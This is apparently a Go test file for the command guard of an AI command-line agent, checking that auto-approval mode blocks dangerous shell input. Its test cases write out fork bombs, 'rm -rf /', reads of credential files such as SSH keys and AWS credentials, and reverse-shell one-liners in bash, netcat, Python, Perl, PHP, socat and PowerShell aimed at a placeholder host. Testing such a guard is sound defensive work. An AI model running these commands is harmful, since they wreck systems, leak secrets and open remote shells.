package runtime

import (
	"strings"
	"testing"

	internalconfig "snz1.cn/gitrepo/dp/ai/taiyi/taiyiflow-cli/internal/config"
)

// TestGuardDangerousCommandForkBombBashClassic verifies that the classic bash
// fork bomb pattern ":(){ :|:& };:" is blocked in auto approval mode.
func TestGuardDangerousCommandForkBombBashClassic(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: ":(){ :|:& };:",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected fork bomb to be blocked, but got nil error")
	}
	if !strings.Contains(err.Error(), "高风险命令") {
		t.Fatalf("expected high-risk error, got: %v", err)
	}
}

// TestGuardDangerousCommandForkBombBashVariant verifies that a variant with
// spaces like ": () { : | : & } ; :" is also blocked via the ":|:&" fragment.
func TestGuardDangerousCommandForkBombBashVariant(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: ": () { : | : & } ; :",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected fork bomb variant to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandForkBombPerl verifies that the perl fork bomb
// "perl -e 'fork while fork'" is blocked.
func TestGuardDangerousCommandForkBombPerl(t *testing.T) {
	payload := commandArguments{
		Mode:    "shell",
		Command: "perl",
		Args:    []string{"-e", "fork while fork"},
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected perl fork bomb to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandForkBombPythonOsFork verifies that python fork
// bomb using os.fork() is blocked.
func TestGuardDangerousCommandForkBombPythonOsFork(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import os; os.fork()'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python os.fork() to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandForkBombPythonWhileLoop verifies that python fork
// bomb with explicit while loop is blocked.
func TestGuardDangerousCommandForkBombPythonWhileLoop(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import os; while True: os.fork()'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python while-loop fork bomb to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandForkBombAllowedInNonAutoMode verifies that fork
// bomb patterns are not blocked when approval mode is not "auto".
func TestGuardDangerousCommandForkBombAllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: ":(){ :|:& };:",
	}
	cfg := internalconfig.Config{ApprovalMode: "readonly"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// TestGuardDangerousCommandExistingHighRisk verifies that existing high-risk
// patterns (rm -rf /) are still blocked.
func TestGuardDangerousCommandExistingHighRisk(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "rm -rf /",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected rm -rf / to be blocked, but got nil error")
	}
}

// TestGuardDangerousCommandSafeCommand verifies that safe commands are not blocked.
func TestGuardDangerousCommandSafeCommand(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "echo hello",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe command to pass, got: %v", err)
	}
}

// ---------------------------------------------------------------------------
// 敏感文件访问拦截测试
// ---------------------------------------------------------------------------

// TestGuardSensitiveFileAccessEtcPasswd verifies that reading /etc/passwd
// via cat is blocked in auto approval mode.
func TestGuardSensitiveFileAccessEtcPasswd(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected /etc/passwd access to be blocked, but got nil error")
	}
	if !strings.Contains(err.Error(), "敏感文件") {
		t.Fatalf("expected sensitive file error, got: %v", err)
	}
}

// TestGuardSensitiveFileAccessEtcShadow verifies that reading /etc/shadow
// via head is blocked.
func TestGuardSensitiveFileAccessEtcShadow(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "head -20 /etc/shadow",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected /etc/shadow access to be blocked")
	}
}

// TestGuardSensitiveFileAccessSSHKey verifies that reading SSH private keys
// is blocked.
func TestGuardSensitiveFileAccessSSHKey(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.ssh/id_rsa",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected SSH key access to be blocked")
	}
}

// TestGuardSensitiveFileAccessAWSCredentials verifies that reading AWS
// credentials is blocked.
func TestGuardSensitiveFileAccessAWSCredentials(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.aws/credentials",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected AWS credentials access to be blocked")
	}
}

// TestGuardSensitiveFileAccessKubeConfig verifies that reading Kubernetes
// config is blocked.
func TestGuardSensitiveFileAccessKubeConfig(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.kube/config",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected kube config access to be blocked")
	}
}

// TestGuardSensitiveFileAccessDockerConfig verifies that reading Docker
// config is blocked.
func TestGuardSensitiveFileAccessDockerConfig(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.docker/config.json",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected Docker config access to be blocked")
	}
}

// TestGuardSensitiveFileAccessNetrc verifies that reading .netrc is blocked.
func TestGuardSensitiveFileAccessNetrc(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.netrc",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .netrc access to be blocked")
	}
}

// TestGuardSensitiveFileAccessGitCredentials verifies that reading
// .git-credentials is blocked.
func TestGuardSensitiveFileAccessGitCredentials(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.git-credentials",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .git-credentials access to be blocked")
	}
}

// TestGuardSensitiveFileAccessNpmrc verifies that reading .npmrc is blocked.
func TestGuardSensitiveFileAccessNpmrc(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.npmrc",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .npmrc access to be blocked")
	}
}

// TestGuardSensitiveFileAccessPypirc verifies that reading .pypirc is blocked.
func TestGuardSensitiveFileAccessPypirc(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat ~/.pypirc",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .pypirc access to be blocked")
	}
}

// TestGuardSensitiveFileAccessGnupg verifies that reading .gnupg is blocked.
func TestGuardSensitiveFileAccessGnupg(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ls ~/.gnupg/",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected .gnupg access to be blocked")
	}
}

// TestGuardSensitiveFileAccessXxd verifies that using xxd to read a sensitive
// file is blocked.
func TestGuardSensitiveFileAccessXxd(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "xxd /etc/passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected xxd /etc/passwd to be blocked")
	}
}

// TestGuardSensitiveFileAccessCp verifies that copying a sensitive file
// is blocked.
func TestGuardSensitiveFileAccessCp(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cp /etc/passwd /tmp/leaked",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected cp /etc/passwd to be blocked")
	}
}

// TestGuardSensitiveFileAccessAllowedInNonAutoMode verifies that sensitive
// file access is not blocked when approval mode is not "auto".
func TestGuardSensitiveFileAccessAllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /etc/passwd",
	}
	cfg := internalconfig.Config{ApprovalMode: "readonly"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// TestGuardSensitiveFileAccessSafeFile verifies that reading a non-sensitive
// file is not blocked.
func TestGuardSensitiveFileAccessSafeFile(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "cat /tmp/hello.txt",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe file access to pass, got: %v", err)
	}
}

// TestGuardSensitiveFileAccessBase64 verifies that using base64 to read a
// sensitive file is blocked.
func TestGuardSensitiveFileAccessBase64(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "base64 /etc/shadow",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected base64 /etc/shadow to be blocked")
	}
}

// ---------------------------------------------------------------------------
// 反向 Shell 探测拦截测试
// ---------------------------------------------------------------------------

// TestGuardReverseShellBashDevTcp verifies that the classic bash /dev/tcp
// reverse shell is blocked.
func TestGuardReverseShellBashDevTcp(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected bash /dev/tcp reverse shell to be blocked")
	}
	if !strings.Contains(err.Error(), "反向 Shell") {
		t.Fatalf("expected reverse shell error, got: %v", err)
	}
}

// TestGuardReverseShellBashShI verifies that "sh -i >&" pattern is blocked.
func TestGuardReverseShellBashShI(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "sh -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected sh -i reverse shell to be blocked")
	}
}

// TestGuardReverseShellNetCatE verifies that "nc -e" reverse shell is blocked.
func TestGuardReverseShellNetCatE(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "nc -e /bin/sh 10.0.0.1 4444",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected nc -e reverse shell to be blocked")
	}
}

// TestGuardReverseShellNcatE verifies that "ncat -e" reverse shell is blocked.
func TestGuardReverseShellNcatE(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ncat -e /bin/bash 10.0.0.1 4444",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ncat -e reverse shell to be blocked")
	}
}

// TestGuardReverseShellNcatC verifies that "ncat -c" reverse shell is blocked.
func TestGuardReverseShellNcatC(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ncat -c /bin/bash 10.0.0.1 4444",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ncat -c reverse shell to be blocked")
	}
}

// TestGuardReverseShellPythonSocket verifies that Python socket-based
// reverse shell is blocked.
func TestGuardReverseShellPythonSocket(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.0.0.1\",4444))'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python socket reverse shell to be blocked")
	}
}

// TestGuardReverseShellPythonDup2 verifies that os.dup2 pattern is blocked.
func TestGuardReverseShellPythonDup2(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "python3 -c 'import os; os.dup2(2,0); os.dup2(2,1)'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected python os.dup2 reverse shell to be blocked")
	}
}

// TestGuardReverseShellPerlSocket verifies that Perl socket-based
// reverse shell is blocked.
func TestGuardReverseShellPerlSocket(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,0); connect(S,sockaddr_in(4444,inet_aton(\"10.0.0.1\")))'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected perl reverse shell to be blocked")
	}
}

// TestGuardReverseShellRubySocket verifies that Ruby socket-based
// reverse shell is blocked.
func TestGuardReverseShellRubySocket(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "ruby -rsocket -e 'TCPSocket.new(\"10.0.0.1\",\"4444\").puts \"hello\"",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected ruby reverse shell to be blocked")
	}
}

// TestGuardReverseShellPHPFsockopen verifies that PHP fsockopen-based
// reverse shell is blocked.
func TestGuardReverseShellPHPFsockopen(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "php -r '$sock=fsockopen(\"10.0.0.1\",4444); exec(\"/bin/sh -i <&3 >&3 2>&3\")'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected php fsockopen reverse shell to be blocked")
	}
}

// TestGuardReverseShellSocat verifies that socat-based reverse shell
// is blocked.
func TestGuardReverseShellSocat(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "socat tcp-connect:10.0.0.1:4444 exec:sh,pty",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected socat reverse shell to be blocked")
	}
}

// TestGuardReverseShellPowerShell verifies that PowerShell TCPClient-based
// reverse shell is blocked.
func TestGuardReverseShellPowerShell(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)\"",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected powershell reverse shell to be blocked")
	}
}

// TestGuardReverseShellBashRedirection verifies that "0>&1" pattern alone
// is blocked (common in reverse shell payloads).
func TestGuardReverseShellBashRedirection(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected 0>&1 redirection to be blocked")
	}
}

// TestGuardReverseShellMkfifoNetcat verifies that mkfifo + nc combination
// is blocked.
func TestGuardReverseShellMkfifoNetcat(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected mkfifo+nc reverse shell to be blocked")
	}
}

// TestGuardReverseShellTelnet verifies that telnet-based reverse shell
// is blocked.
func TestGuardReverseShellTelnet(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "telnet 10.0.0.1 4444",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected telnet reverse shell to be blocked")
	}
}

// TestGuardReverseShellDevUdp verifies that /dev/udp pattern is blocked.
func TestGuardReverseShellDevUdp(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "bash -i >& /dev/udp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected /dev/udp reverse shell to be blocked")
	}
}

// TestGuardReverseShellAllowedInNonAutoMode verifies that reverse shell
// patterns are not blocked when approval mode is not "auto".
func TestGuardReverseShellAllowedInNonAutoMode(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
	}
	cfg := internalconfig.Config{ApprovalMode: "readonly"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected no error in non-auto mode, got: %v", err)
	}
}

// TestGuardReverseShellSafeCommand verifies that safe network commands
// are not blocked.
func TestGuardReverseShellSafeCommand(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "curl https://example.com/api",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err != nil {
		t.Fatalf("expected safe curl command to pass, got: %v", err)
	}
}

// TestGuardReverseShellSocketCreate verifies that PHP socket_create pattern
// is blocked.
func TestGuardReverseShellSocketCreate(t *testing.T) {
	payload := commandArguments{
		Mode:       "shell",
		RawCommand: "php -r 'socket_create(AF_INET, SOCK_STREAM, SOL_TCP)'",
	}
	cfg := internalconfig.Config{ApprovalMode: "auto"}
	err := guardDangerousCommand(payload, cfg)
	if err == nil {
		t.Fatal("expected php socket_create to be blocked")
	}
}
